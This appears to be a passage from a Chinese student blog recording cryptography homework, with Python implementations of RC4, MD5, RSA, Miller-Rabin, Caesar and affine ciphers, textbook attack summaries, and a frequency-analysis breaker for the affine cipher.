^ text[i]) % 128 cipher += chr(t)plain = \"\"for i in range(len(text)): t = (q[i] ^ ord(cipher[i])) % 128 plain += chr(t)if sys.argv[1] == \"d\": print(\"plain: \") print(plain)else: print(\"cipher: \") print(base64.b64encode(cipher.encode('utf-8')).decode('utf-8'))f.close() 实例演示： ​ 代码中加密的是一段英文文本，密文转为base64编码存储 安全性分析 ​ 由于RC4算法加密采用的是xor异或运算，所以一旦子密钥序列出现了重复，密文就有可能被破解。 那么，RC4算法生成的子密钥序列是否会出现重复呢？由于存在部分弱密钥，使得子密钥序列在不到100万字节内就发生了完全的重复，如果是部分重复，则可能在不到10万字节内就能发生重复。所以在使用中应该对密钥进行检查。 ​ 根据目前的分析结果，没有任何的分析对于密钥长度达到128位的RC4有效，目前主要的攻击方法还是穷举攻击，所以到目前为止，RC4还算一个安全的加密算法。 ​ 2015年，比利时研究人员Mathy Vanhoef及Frank Piessens，公布了针对RC4加密算法的新型攻击程式，可在75小时内取得cookie的内容。 实用性分析 ​ RC4算法等序列密码加密过程较之分组密码而言相对简单，实现起来相对容易，在加密效率上对分组密码的优势是不言而喻的。此外，对于需要加密/解密数据流的应用，比如在数据通信信道或浏览器/网络链路上，流密码可能是更好的选择 。 ​ 流密码在安全性强度上不逊分组密码，而加密速率又远优于后者，那是不是说明流密码可以完全取代分组密码呢？很可惜，答案是否定的。 ​ 众所周知，分组密码的设计关键在于加解密算法，是明文和密文在密钥的控制下尽可能复杂，而序列密码的设计关键在于密钥序列产生器，使生成的密钥序列具有不可预测性。而密码序列产生器，也就是伪随机数字节流的产生，依赖种子（密钥）和伪随机函数，而如果种子和伪随机函数不变的情况下，每次产生的伪随机数字节流都是一样的。如果每次都用同样的密钥作为PRF的输入，产生同样的密码流来与两个不同的明文流分别进行异或运算得到两个密文流，那么将这两个密文流进行异或，结果就是两个原始明文的异或值。如果明文是文本字符串或其他已知其性质的字节流，那么密码破解很可能会成功。因此，对于这些已知性质的字节流进行流密码加密，密钥就不能被重复使用了。在这一点上，分组密码的优点就体现出来了。 哈希函数​ 哈希函数的单向性，压缩性，抗碰撞性等特点使得它能够解决实际应用中很多棘手的安全问题，诸如数字签名，文件指纹等。 MD5算法​ MD5(Message Digest Algorithm 5)，为计算机安全领域广泛使用的一种散列函数，用以提供消息的完整性保护。 ​ MD5是一种信息摘要算法，MD5算法对输入任意长度的消息进行运行，通过特定的hash散列方法将文本信息转换成产生一个128位的消息摘要，压缩+加密+hash算法的结合体，是绝对不可逆的。 算法原理：​ 步骤一：数据填充。对消息进行数据填充，使消息的长度对512取模得448，设消息长度为X，即满 足X mod 512=448。根据此公式得出需要填充的数据长度。填充方法：在消息后面进行填充，填充第一位为1，其余为0。 步骤二：添加消息长度。在第一步结果之后再填充上原消息的长度，可用来进行的存储长度为64位。如果消息长度大于264，则只使用其低64位的值，即（消息长度 对 264取模）。在此步骤进行完毕后，最终消息长度就是512的整数倍。 步骤三：初始化链接变量。MD5使用4个32位的寄存器A、B、C、D，最开始存放4个固定的32位初始链接变量，这些参数用于第一轮迭代。 步骤四：分组处理。将每个分组（512比特）分成16个小组，每个小组32位，这些分组参与每轮16步的函数运算，输出为32位值，经过4轮（共有四个轮函数）共64步之后，得到的4个寄存器的值分别于输入链接变量进行模加，即得到此次分组处理的输入链接变量。第四轮最后一步完成后，再与该分组最初的寄存器的初值相加，然后把A、B、C、D的值作为下一个迭代压缩的链接变量输入，直到最后一个消息分组得到的A、B、C、D寄存器值级联输出作为128比特的消息散列值。 ​ 此处需要特别指出的是，在MD5的代码实现中，要特别注意小端序和大端序的问题，这个问题如果不注意的话会导致MD5计算出错。而MD5的所有数据计算都是基于小端序的。 小端字节序（Little Endian）：低位字节存放在低内存地址，高位字节存放在高内存地址端。 大端字节序（Big Endian）：高位字节存放在低内存地址，低位字节存放在高内存地址端。 ​ 在步骤二中添加消息长度就要按照小端序的方法填充长度，同时轮函数中各个参数也要按照小端序来计算，这点一定要特别注意。 ​ 还有对于需要处理多个分组的情况，要做好A、B、C、D寄存器的及时更新，否则无法得到正确的MD5值。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250import math# 字符串转为2进制def str2bin(s): text = \"\" for i in s: text += '&#123;:0&gt;8&#125;'.format(bin(ord(i))[2:]) return text# 附加填充，输入为字母明文，输出为二进制def additonal_filling(data): bin_data = str2bin(data) origi_mess_len = len(bin_data) if origi_mess_len &gt; math.pow(2,64): print('Message too long!') return \"0\" else: bit_origi_mess_len = f'&#123;bin(origi_mess_len)[2:]:0&gt;64&#125;' mod_remain = origi_mess_len % 512 # 余数 if mod_remain &lt; 449: padding_len = 448 - mod_remain else: padding_len = 448 - mod_remain + 512 if padding_len == 1: bin_data += '1' elif padding_len &gt; 1: bin_data = bin_data + '1' + '0' * (padding_len-1) left = bit_origi_mess_len[:32] right = bit_origi_mess_len[32:] left = left[24:32] + left[16:24] + left[8:16] + left[:8] right = right[24:32] + right[16:24] + right[8:16] + right[:8] # 32为为一组 bin_data += (right + left) return bin_data# 迭代压缩，输出为分组比特消息数组，每组的长度为512bitdef iter_compress(bdata): group_mess = [[]*16] # 分组消息数组 print(len(bdata)) for i in range(len(bdata)//512): temp = bdata[i*512:i*512+512] for j in range(16): print(temp[j*32:j*32+32]) group_mess[i].append(temp[j*32:j*32+32]) return group_mess# 小端序处理 @input hexdef little_endian(x,n): x = f'&#123;bin(x)[2:]:0&gt;&#123;n&#125;&#125;' ans = \"\" for i in range(n//8,0,-1): ans += x[(i-1)*8:i*8] return int(ans,2)# 由于逻辑非比较特殊，所以另外实现一下,输入为16进制数据def not_operate(data): data = f'&#123;bin(data)[2:]:0&gt;32&#125;' out = \"\" for i in data: if i == \"0\": out += \"1\" else: out += \"0\" return int(out,2)# 四个非线性函数,输入均为32bit的三个数据# @input hexdef F(x, y, z): return (x&amp;y) | (not_operate(x) &amp; z)def G(x,y,z): return (x &amp; z) | (y &amp; not_operate(z))def H(x,y,z): return (x ^ y ^ z)def I(x,y,z): return y ^ (x | not_operate(z))def rotate_move(x,n): x = f'&#123;bin(x)[2:]:0&gt;32&#125;' return int(x[n:] + x[:n],2)# t[i]，返回10进制def get_t(i): return int(math.pow(2,32) * abs(math.sin(i)))# @input digitaldef FF(a,b,c,d,m,s,Ti): # m = int(m,2) m = little_endian(int(m,2),32) t = a + F(b,c,d) + m + Ti t = t % (2**32) a = (rotate_move(t,s) + b) % (2**32) return adef GG(a,b,c,d,m,s,Ti): m = little_endian(int(m,2),32) t = a + G(b,c,d) + m + Ti t = t % (2**32) a = (rotate_move(t,s) + b) % (2**32) return adef HH(a,b,c,d,m,s,Ti): m = little_endian(int(m,2),32) t = a + H(b,c,d) + m + Ti t = t % (2**32) a = (rotate_move(t,s) + b) % (2**32) return a def II(a,b,c,d,m,s,Ti): m = little_endian(int(m,2),32) t = a + I(b,c,d) + m + Ti t = t % (2**32) a = (rotate_move(t,s) + b) % (2**32) return adef step_function(M): global A global B global C global D # 复制前一分组的链接变量 AA = A BB = B CC = C DD = D for i in range(len(M)): # 第一轮循环 A = FF(A,B,C,D,M[i][0],7,get_t(1)) D = FF(D,A,B,C,M[i][1],12,get_t(2)) C = FF(C,D,A,B,M[i][2],17,get_t(3)) B = FF(B,C,D,A,M[i][3],22,get_t(4)) A = FF(A,B,C,D,M[i][4],7,get_t(5)) D = FF(D,A,B,C,M[i][5],12,get_t(6)) C = FF(C,D,A,B,M[i][6],17,get_t(7)) B = FF(B,C,D,A,M[i][7],22,get_t(8)) A = FF(A,B,C,D,M[i][8],7,get_t(9)) D = FF(D,A,B,C,M[i][9],12,get_t(10)) C = FF(C,D,A,B,M[i][10],17,get_t(11)) B = FF(B,C,D,A,M[i][11],22,get_t(12)) A = FF(A,B,C,D,M[i][12],7,get_t(13)) D = FF(D,A,B,C,M[i][13],12,get_t(14)) C = FF(C,D,A,B,M[i][14],17,get_t(15)) B = FF(B,C,D,A,M[i][15],22,get_t(16)) # 第二轮循环 A = GG(A,B,C,D,M[i][1],5,get_t(17)) D = GG(D,A,B,C,M[i][6],9,get_t(18)) C = GG(C,D,A,B,M[i][11],14,get_t(19)) B = GG(B,C,D,A,M[i][0],20,get_t(20)) A = GG(A,B,C,D,M[i][5],5,get_t(21)) D = GG(D,A,B,C,M[i][10],9,get_t(22)) C = GG(C,D,A,B,M[i][15],14,get_t(23)) B = GG(B,C,D,A,M[i][4],20,get_t(24)) A = GG(A,B,C,D,M[i][9],5,get_t(25)) D = GG(D,A,B,C,M[i][14],9,get_t(26)) C = GG(C,D,A,B,M[i][3],14,get_t(27)) B = GG(B,C,D,A,M[i][8],20,get_t(28)) A = GG(A,B,C,D,M[i][13],5,get_t(29)) D = GG(D,A,B,C,M[i][2],9,get_t(30)) C = GG(C,D,A,B,M[i][7],14,get_t(31)) B = GG(B,C,D,A,M[i][12],20,get_t(32)) # 第三轮循环 A = HH(A,B,C,D,M[i][5],4,get_t(33)) D = HH(D,A,B,C,M[i][8],11,get_t(34)) C = HH(C,D,A,B,M[i][11],16,get_t(35)) B = HH(B,C,D,A,M[i][14],23,get_t(36)) A = HH(A,B,C,D,M[i][1],4,get_t(37)) D = HH(D,A,B,C,M[i][4],11,get_t(38)) C = HH(C,D,A,B,M[i][7],16,get_t(39)) B = HH(B,C,D,A,M[i][10],23,get_t(40)) A = HH(A,B,C,D,M[i][13],4,get_t(41)) D = HH(D,A,B,C,M[i][0],11,get_t(42)) C = HH(C,D,A,B,M[i][3],16,get_t(43)) B = HH(B,C,D,A,M[i][6],23,get_t(44)) A = HH(A,B,C,D,M[i][9],4,get_t(45)) D = HH(D,A,B,C,M[i][12],11,get_t(46)) C = HH(C,D,A,B,M[i][15],16,get_t(47)) B = HH(B,C,D,A,M[i][2],23,get_t(48)) # 第四轮循环 A = II(A,B,C,D,M[i][0],6,get_t(49)) D = II(D,A,B,C,M[i][7],10,get_t(50)) C = II(C,D,A,B,M[i][14],15,get_t(51)) B = II(B,C,D,A,M[i][5],21,get_t(52)) A = II(A,B,C,D,M[i][12],6,get_t(53)) D = II(D,A,B,C,M[i][3],10,get_t(54)) C = II(C,D,A,B,M[i][10],15,get_t(55)) B = II(B,C,D,A,M[i][1],21,get_t(56)) A = II(A,B,C,D,M[i][8],6,get_t(57)) D = II(D,A,B,C,M[i][15],10,get_t(58)) C = II(C,D,A,B,M[i][6],15,get_t(59)) B = II(B,C,D,A,M[i][13],21,get_t(60)) A = II(A,B,C,D,M[i][4],6,get_t(61)) D = II(D,A,B,C,M[i][11],10,get_t(62)) C = II(C,D,A,B,M[i][2],15,get_t(63)) B = II(B,C,D,A,M[i][9],21,get_t(64)) A = (AA + A) % 2**32 B = (BB + B) % 2**32 C = (CC + C) % 2**32 D = (DD + D) % 2**32 AA = A BB = B CC = C DD = Ddef encrypt(word): global A,B,C,D # 初始化链接向量 A = 0x67452301 B = 0xEFCDAB89 C = 0x98BADCFE D = 0x10325476 bintext = additonal_filling(word) bdata = bintext group_mess = [[]*16] # 分组消息数组 for i in range(16): group_mess[0].append(\"\") for i in range(len(bdata)//512): temp = bdata[i*512:i*512+512] for j in range(16): group_mess[0][j] = temp[j*32:j*32+32] step_function(group_mess) A = hex(A)[2:] B = hex(B)[2:] C = hex(C)[2:] D = hex(D)[2:] # 按小端字节序级联输出 out = \"\" for item in (A,B,C,D): for i in range(8//2): out += item[(3-i)*2:(3-i)*2+2] return outif __name__ == '__main__': word1 = \"iscbupt\" word2 = \"Beijing University of Posts and TelecommunicationsBeijing University of Posts and Telecommunications\" word3 = \"State Key Laboratory of Networking and Switching\" word4 = \"Hello! Bob, I'm Alice! We could communicate with each other now, It's so great!\" print(word1) print(encrypt(word1)) print(word2) print(encrypt(word2)) 实例演示： 安全性分析 ​ MD5算法是一种哈希算法，所以对于MD5算法的安全问题主要在于它是否具有足够的抗碰撞性。 ​ 在碰撞攻击方面，王小云教授研究很深入，她的成果集中在加速构造碰撞对。原来理论上构造出一个MD5碰撞对需要2^64次尝试，而现在只需要2^39次，其算法大大加速了这一过程。但从应用场景上来看，它本身并不具备太多的应用价值，因为构造出的碰撞很可能毫无意义。它的价值在于，在此算法基础上衍生出来的一系列MD5的算法，能够在部分场景下，构造出一个有意义的伪造信息，并且MD5值保持不变。所以，单单看这个算法本身就说MD5不安全，有些夸大其实。但是，后续的那些算法出现之后，MD5的安全性就真的有些令人担忧了，也就是下文要说的两种算法。 哈希长度扩展攻击，具体细节可以参考大牛道哥的博文 http://blog.chinaunix.net/uid-27070210-id-3255947.html，简单说来就是在已知输入M的长度（注意是长度）和其MD5值的情况下，可以在原文M后面附加任意内容，同时能够推算出新的MD5。在某些将MD5作为签名手段的系统中，攻击者可以在原文M后面随意添加内容同时能够提供正确的MD5值。 在校学习平台上就有类似的题目 存在这一问题的原因是算法使用了Merkle–Damgård construction进行数据的压缩，不止MD5，很多流行的算法都存在这个问题，比如SHA1。 特定前缀攻击。两个不同的exe程序会在屏幕上打出不同的字符，但是他们的MD5值确是相同的，exe程序下载地址如下 link，专家还给出了MD5碰撞快读生成器。 面对这两个攻击，一个提高MD5安全性的有效手段是 加盐（每一个口令同一个叫做”盐“（salt）的n位随机数相关联 ）。 实用性分析： ​ 即使MD5现在已经被证明不是百分百安全的，但是被攻破只是有限情况下的个例，对于大多数安全性要求不是很高的应用中，MD5依然拥有广泛的使用空间。MD5具有压缩性，容易计算，抗修改性和强抗碰撞性等特点，在实际应用中，其结果方便存储，在对文件加密上有很大的优势（只需要32位字符串就能对一个巨大的文件进行验证完整性 ），且加密损耗低，对性能要求较低，计算迅速。由于其不可逆的特性，在实际应用中可以用来用户密码，请求参数校验，文件校验等用途。 公钥密码RSA公钥加密体制​ RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年7月首次在美国公布，当时他们三人都在麻省理工学院工作实习。RSA就是他们三人姓氏开头字母拼在一起组成的。RSA是目前最有影响力和最常用的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准，是一种非对称加密算法。RSA是目前最重要的网络加密算法。 算法原理： RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难 ​ 第一步 选定两个质数p、q，实际应用中这两个数越大安全性越高。 ​ 第二步 计算p、q的乘积，即n = p&#42;q，n的二进制表示时所占的二进制位数就是密钥长度，实际应用中密钥长度一般为1024位，对于更高保密级别的应用则为2048位。 ​ 第三步 计算n的 欧拉函数 φ(n) = (p-1)&#42;(q-1)，为了保持连贯性，欧拉函数先按下不表 ​ 第四步 随机选定一个数e1，要求1 &lt; e1 &lt; φ(n)，并且要求e1与n互质（实际应用中这个数字常选择65537），不知道什么是互质请点击这里 ​ 第五步 寻找一个e2，要求 e1 &#42; e2 ≡ 1 （mod φ(n)），好像是可以用扩展欧几里得算法 算出来，但是恕本人实在对数学不感冒，这个就略过了，想学的自己百度吧。 ​ 第六步 封装（n，e1）为公钥 ，（n，e2）为私钥。 ​ 至此，所有准备工作完成。 ​ 加密和解密 先介绍一下加解密的公式，假定明文为A，那么， 密文B≡A^e1 mod n，要传输给对方的就是B 对方得到B之后利用私钥进行恢复，公式A≡B^e2 mod n，从而得到明文A。 ​ 假定我选择了p = 5，q = 7，那么相应的n = 35，φ（n） = 24，再假定我选择了e1 = 5，那么e2 = 29（别问我怎么算出来的，我是不会告诉你我是编代码试出来的！！），那么我的公钥就是（5，35），私钥就是（29，35）。那么接下来就开始我们的秘密通信(^▽^)。 假定要传输的明文为： 32 注意：传输的内容必须为整数，并且要小于n，如果要传送字符串，可以用ascii码或unicode 编码传输。 ​ 加密 A = 32，则B=A^e1 mod n = 2，将密文B发送，这个过程使用公钥进行加密 ​ 解密 A = B^e2 mod n = 32 ，成功得到明文32！ 简单证明一下上述算法的正确性： 欧拉定理 若n,a为正整数，且n,a互质，则$a^{φ(n)} ≡ 1 （mod \\; n）$ ​ φ（n）为 欧拉函数 ,欧拉函数是小于n的正整数中与n互质的数的个数，下面介绍一个性质 如果n可以分解为两个互质的整数p、q的乘积，那么有φ（n）= (p-1) * (q-1) ​ 接下来要证明的就是为什么下面两个式子可以互换实现 B=A^e1 mod nA=B^e2 mod n ​ 解密规则为 A=B^e2 mod n ​ 根据加密规则 B = A^e1 mod nB = A^e1 - kn ​ 代入解密式中 (A^e1 - kn)^e2 ≡ A （mod n） ​ 等于证 $A^{e1*e2} ≡ m （mod \\; n）$ ​由 欧拉定理 可以得到 e1&#42;e2 ≡ 1 [ mod φ（n）]e1&#42;e2 ≡ hφ（n）+1 ​ 代入前面的式子可以得到 $A^{hφ（n）+1} \\; ≡ m (mod\\;n)$ ​ 上式恒成立，则算法正确性得证。 代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586import gmpy2 as gpimport mathimport sys# 字符串转为2进制def str2bin(s): text = \"\" for i in s: text += '&#123;:0&gt;8&#125;'.format(bin(ord(i))[2:]) return textdef bin2str(s): text = \"\" for i in range(len(s)//8): if int(s[i*8:i*8+8], 2) == 0: continue text += chr(int(s[i*8:i*8+8], 2)) return textdef fastExpMod(b, e, m): result = 1 while e != 0: if (e&amp;1) == 1: # ei = 1, then mul result = (result * b) % m e &gt;&gt;= 1 b = (b*b) % m return result# 加密函数,输入为plain字符明文，n，edef rsa_encrypt(plain): global n global e # 将明文转为比特串 bitplian = str2bin(plain) group_len = int(math.log(n,2)) - 1 arr_group = [] if (len(bitplian) % group_len) != 0: bitplian += \"0\"*(group_len-(len(bitplian) % group_len)) for i in range(len(bitplian) // group_len): arr_group.append(bitplian[i*group_len:i*group_len+group_len]) cipher = \"\" for item in arr_group: ci = fastExpMod(int(item,2),e,n) cipher += f'&#123;bin(ci)[2:]:0&gt;&#123;group_len+2&#125;&#125;' return hex(int(cipher,2))[2:]# 解密函数，输入为cipehr16进制密文，n，ddef rsa_decrypt(cipher): global n global d bitcipher = bin(int(cipher,16))[2:] temp_len = int(math.log(n,2)) + 1 if (len(bitcipher) % temp_len) != 0: bitcipher = \"0\"*(temp_len - (len(bitcipher) % temp_len)) + bitcipher group_len = int(math.log(n,2)) + 1 arr_group = [] for i in range(len(bitcipher) // group_len): arr_group.append(bitcipher[i*group_len:i*group_len+group_len]) bitplain = \"\" for item in arr_group: # mi = (int(item,2)**d % n) mi = fastExpMod(int(item,2),d,n) bitplain += f'&#123;bin(mi)[2:]:0&gt;&#123;group_len-2&#125;&#125;' return bin2str(bitplain)p = 2147483647q = 1000000007n = p * qpi_n = (p-1) * (q-1)e = 65537d = int(gp.invert(e,pi_n))if __name__ == \"__main__\": mode = sys.argv[1] if mode == 'e': plain = input(\"Plz input message: \") cipher = rsa_encrypt(plain) print(\"cipher: \", cipher) elif mode == 'd': cipher = input(\"Plz input cipher: \") plain = rsa_decrypt(cipher) print(\"plain: \",plain) else: pass 实例演示： 安全性分析 ​ 到目前为止，世界上还没有任何可靠的攻击RSA算法的方式 。然而即便RSA算法目前来说是安全可靠的，但是错误的应用场景，错误的环境配置，以及错误的使用方法，都会导致RSA的算法体系出现问题，从而也派生出针对各种特定场景下的RSA攻击方法。 此处指简单列举一些攻击方法 直接分解n。一般这种情况是由于n较小，或者使用已经使用过的p、q造成的，这样会造成RSA直接被破解 低加密指数攻击。当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。 当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。 即： cequiv m^e mod n 如果e=3，且$ m^e&lt;{n} $，那么： ​ $ c= m^e,$ $e=3$ ​ $ m=sqrt[3]{c}$ 如果明文的三次方比n大，但是不是足够大，那么设k，有： ​ $ c= m^e+kn$ 爆破k，如果$ c-kn $能开三次根式，那么可以直接得到明文。 低加密指数广播攻击。如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。 即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有： ​ $ c_1equiv m^e$ $mod$ $n_1$ ​ $ c_2equiv m^e$ $mod$ $n_2$ ​ $ c_3equiv m^e$ $mod$ $n_3$ 对上述等式运用中国剩余定理，在e=3时，可以得到： ​ $ c_xequiv m^3$ $mod$ $n_1n_2n_3$ 通过对$ c_x $进行三次开方可以求得明文。 公模攻击。如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。 即： ​ $ c_1equiv m^{e_1}$ $mod$ $n$ ​ $ c_2equiv m^{e_2}$ $mod$ $n$ 此时不需要分解n，不需要求解私钥，如果两个加密指数互素，就可以通过共模攻击在两个密文和公钥被嗅探到的情况下还原出明文m的值。 ​ 由于RSA良好的安全性，RSA可用来电子签名中来确认通信双方身份。 通过对RSA的分析可知，RSA的安全性是基于大数的难分解性的，所以应尽可能选择足够大的p、q，目前大素数的产生依然是一个世界难题，这里展示一个素性判断算法miller-rabin算法，可以利用此算法判断一个数是不是素数从而穷举产生大素数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from random import randintimport mathdef xn_mod_p2(x, n, p): res = 1 # n_bin = bin(n)[2:] n_bin = bin(int(n))[2:] for i in range(0, len(n_bin)): res = res**2 % p if n_bin[i] == '1': res = res * x % p return resdef miller_rabin_witness(a, p): if p == 1: return False if p == 2: return True #p-1 = u*2^t 求解 u, t n = p - 1 t = int(math.floor(math.log(n, 2))) u = 1 while t &gt; 0: u = n / 2**t if n % 2**t == 0 and u % 2 == 1: break t = t - 1 b1 = b2 = xn_mod_p2(a, u, p) for i in range(1, t + 1): b2 = b1**2 % p if b2 == 1 and b1 != 1 and b1 != (p - 1): return False b1 = b2 if b1 != 1: return False return Truedef prime_test_miller_rabin(p, k): while k &gt; 0: a = randint(1, p - 1) if not miller_rabin_witness(a, p): return False k = k - 1 return Truenum = input(u\"请输入要进行Miller-Rabin算法检测的数：\")if prime_test_miller_rabin(int(num),10): print (u\"&#123;0&#125;大概率是素数\".format(num))else: print (u\"&#123;0&#125;是合数 \".format(num)) 实例演示： 通信过程模拟​ 有了前面的算法基础，我们现在可以模拟出一个从Alice到Bob的通信过程，步骤如下: ​ 接下来用代码详细模拟了一下该过程 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import rsaimport md5import desprint(\"现在开始模拟Alice到Bob之间的通信过程：\")print()print('*******Alice的发送准备*********')print()message = \"Hello! Bob, I'm Alice! We could communicate with each other now, It's so great!\"# 设定message哈希值message_hash = md5.encrypt(message)sign = rsa.rsa_encrypt(message_hash)key = \"infosecu\"print(\"Alice想要发送到明文信息: \",message)print(\"Alice的DES秘钥：\", key)print(\"消息哈希(用于检验消息完整性): \",message_hash)print(\"Alice签名: \", sign)print()print('公开信道上传输DES加密数据')print()print('*******sending...**********')print()send_mess = des.encrypt(message,key)send_sign = des.encrypt(sign,key)print(\"message: \",send_mess)print(\"sign: \",send_sign)print(\"message_hash: \",message_hash)print()print('********sending finish*******')print()print()print(\"********Bob处理收到的信息********\")print()print(\"DES解密对应的内容：\")b_sign = des.decrypt(send_sign,key)b_mess = des.decrypt(send_mess,key)print(\"Alice发送的明文message： \",b_mess)print(\"消息签名sign： \",b_sign)print()b_mess_hash = md5.encrypt(message)print(\"此时Bob自己求出明文哈希值： \", b_mess_hash)print(\"之后与Alice发送的消息哈希进行校验\")print(\"...****....\")print(b_mess_hash,\"==\",message_hash,\"消息在传输过程中没有出错! 但是无法确定是否是Alice所发。\")print()vert = rsa.rsa_decrypt(sign)print(\"Bob对签名进行RSA解密： \",vert)print(\"对解密后的签名值与自己计算出的MD5值相比较来验证发送方身份..\")print(\"verting.....\")if vert == b_mess_hash: print(\"message is ok. 此时Bob可以确认从Alice处收到了完整的信息。\")else: print(\"message is broken.\")print()print(\"通信过程完成，Bob收到了Alice的信息！\") 实例演示：","categories":[{"name":"Record","slug":"Record","permalink":"http://chaosec.top/categories/Record/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://chaosec.top/tags/Crypto/"}]},{"title":"密码学作业记录（一）","slug":"crypto1","date":"2019-01-15T14:28:46.000Z","updated":"2019-01-30T11:44:17.367Z","comments":true,"path":"2019/01/15/crypto1/","link":"","permalink":"http://chaosec.top/2019/01/15/crypto1/","excerpt":"前言最近在学习密码学，研究了一些密码学算法，特此记录一下。","text":"前言最近在学习密码学，研究了一些密码学算法，特此记录一下。 古典密码古典密码体制是基于古代落后的计算条件和落后的密码学与数学知识建立的，本部分选取了凯撒密码和仿射密码。 凯撒密码凯撒密码本质上是一种置换密码，且为一对一的置换加密方式。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。 代码如下 1234567891011121314151617181920212223# 名密文输入范围是26个英文小写字母import sysmode = sys.argv[1]if mode == \"encrypt\": plain = raw_input(\"Please input plaintext: \") key = input(\"Please input key: \") cip = \"\" for i in range(len(plain)): temp = (ord(plain[i]) - ord('a') + key) % 26 + ord('a') cip += chr(temp) print(\"cipher: \" + cip)elif mode == \"decrypt\": cipher = raw_input(\"Please input cipher: \") key = input(\"Please input key: \") pla = \"\" for i in range(len(cipher)): temp = (ord(cipher[i])-ord(\"a\") - key) % 26 + ord('a') pla += chr(temp) print(\"plaintext: \" + pla)else: print(sys.argv[1],\" is not supported:(\") 安全性分析：可以看到，凯撒密码的加解密方式简单，手工即可实现，在古代落后的计算能力之下，该中算法拥有着很高的安全性，但是放在现在由于计算能力的提高，该算法表现出脆弱性，无法抵抗穷举攻击，因为对于一串明文，可能的加密组合只有26种，以现在的计算手段，对于任何攻击方式都表现出极大的脆弱性，当遭受已知明文攻击时完全没有抵抗性，故而现代密码体制中已不再采用该密码。 仿射密码仿射密码的加密算法就是一个线性变换，及对任意的明文字符x，对应的密文字符为 y≡e(x)≡ax+b(mod 26)，其中a,b均为26以内的正整数，并且要求gcd(a,26)=1，函数e(x)称为仿射加密函数，解密时用x≡d(e(x))≡a&#39;(e(x)-b)(mod 26)来解密。 代码如下： 1234567891011121314151617181920212223242526272829303132import sysimport mathdef get_re(a): for i in range(0,27): if i*a % 26 == 1: return i# ex = ax+bmode = sys.argv[1]if mode == \"e\": p = str(input(\"Plz input plain: \")) a = int(input(\"Plz input a: \")) b = int(input(\"Plz input b: \")) c = \"\" for i in range(len(p)): t = ((ord(p[i]) - ord('a')) * a + b) % 26 + ord('a') c += chr(t) print(\"cipher: \" + c)elif mode == \"d\": # a'(e(x)-b) c = str(input(\"Plz input cipher: \")) a = int(input(\"Plz input a: \")) b = int(input(\"Plz input b: \")) p = \"\" _a = get_re(a) for i in range(len(c)): t = (ord(c[i]) - ord('a') - b)*_a % 26 + ord('a') p += chr(t) print(\"plain: \" + p)else: print(\"Input Error:(\") 加密时按照加密公式给出，解密时用穷举法求出a的逆元从而解密。 实例演示 可以看到，仿射加密和凯撒加密本质都是一种一对一的加密方式，这种加密方式没有将字母出现的统计规律隐藏起来，在英文中对于足够长的英文文本来说，字符的出现频率是相对固定的，还有字母的有些组合出现频率也是相对固定的，这样就可以通过统计分析法来破解上述加密方式加密出来的密文。 频率分析法破解仿射密码 12假如我们已知一串密文 fmxvedkaphferbndkrxrsrefmorudsdkdvshvufedkaprkdlyevlrhhrh，此时可以通过频率分析法尝试爆破出明文 代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import gmpy2import sysdic = ['e','t','a','o','i','n','s','h','r','d','l','c','u','m','w','f','g','y','p','b','v','k','j','x','q','z']freq = [0] * 26cipher = input(\"Plz input cipher: \")# 频率统计for i in range(len(cipher)): t = ord(cipher[i])-ord('a') freq[t] += 1 def get_ab(x,y): dic = ['e','t','a','o','i','n','s','h','r','d','l','c','u','m','w','f','g','y','p','b','v','k','j','x','q','z'] repeat = [] # 去除重复计算的项 for one in dic: for two in dic: o = ord(one) - ord('a') t = ord(two) - ord('a') oo = ord(x) - ord('a') tt = ord(y) - ord('a') # oo = a*o+b # tt = a*t+b if o - t == 0: continue a = ((oo-tt)//(o-t)) % 26 b = (oo - a * o) % 26 test = int(gmpy2.gcd(a, 26)) if test != 1: continue else: _a = gmpy2.invert(a, 26) plain = \"\" if (a,b) in repeat: continue for item in cipher: ex = ord(item) - ord('a') p = (_a * (ex - b)) % 26 plain += chr(p+ord('a')) repeat.append((a,b)) print(plain,end=\"\") print(\"**\" + str(a) + \"**\" + str(b)) print(\"共\" + str(len(repeat)) + \"项.\")x = chr(freq.index(max(freq)) + ord('a'))freq[freq.index(max(freq))] = 0y = chr(freq.index(max(freq)) + ord('a'))get_ab(x,y) 代码思路是先统计密文的字母出现频率，由频率高低依次对应字母频次表，联立方程组，由于未知数只有a、b，所以只需要两个方程是即可解出，依次尝试不同的变换组合即可，直至得到有意义的明文，由于统计基数的原因，密文越长，则越可能早的得到有意义的密文。为了使结果显示更加有效，代码中过滤了冗余的待选明文项（即a、b相同的情况）。 可以看到密文被成功破解 